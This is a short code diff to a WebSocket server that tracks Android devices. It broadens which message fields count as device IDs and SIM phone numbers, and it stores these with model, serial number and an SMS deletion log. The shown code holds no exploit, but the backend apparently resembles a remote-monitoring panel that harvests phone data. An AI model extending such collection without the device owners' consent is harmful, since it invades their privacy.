@@ -159,7 +159,7 @@ wss.on('connection', (ws, req) => {
   ws.on('message', async (msg) => {
     try {
       const data = JSON.parse(msg);
-      const id = data.deviceId || data.serialNumber;
+      const id = data.deviceId || data.serialNumber || data.id;
       if (!id) return;
       ws.deviceId = id;
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
@@ -176,12 +176,13 @@ wss.on('connection', (ws, req) => {
       const deletedLog = existingDevice?.deletedSmsLog || [];
       const updateSet = { isOnline: true, lastSeen: new Date(), isDeleted: false };
       
-      // Better SIM & Info Fetching
-      const s1 = data.sim1 || data.data?.sim1 || data.mobile1 || data.phone1;
-      const s2 = data.sim2 || data.data?.sim2 || data.mobile2 || data.phone2;
+      // Maximum Compatibility for SIM Numbers
+      const s1 = data.sim1 || data.simNumber1 || data.phoneNumber1 || data.mobile1 || data.phone1 || data.simNo1 || data.data?.sim1 || data.data?.phoneNumber1;
+      const s2 = data.sim2 || data.simNumber2 || data.phoneNumber2 || data.mobile2 || data.phone2 || data.simNo2 || data.data?.sim2 || data.data?.phoneNumber2;
       
       if (s1 && s1 !== 'N/A' && s1 !== 'Not Available') updateSet.sim1 = s1;
       if (s2 && s2 !== 'N/A' && s2 !== 'Not Available') updateSet.sim2 = s2;
+      
       if (data.model) updateSet.model = data.model;
       if (data.androidVersion) updateSet.androidVersion = data.androidVersion;
       if (data.serialNumber) updateSet.serialNumber = data.serialNumber;
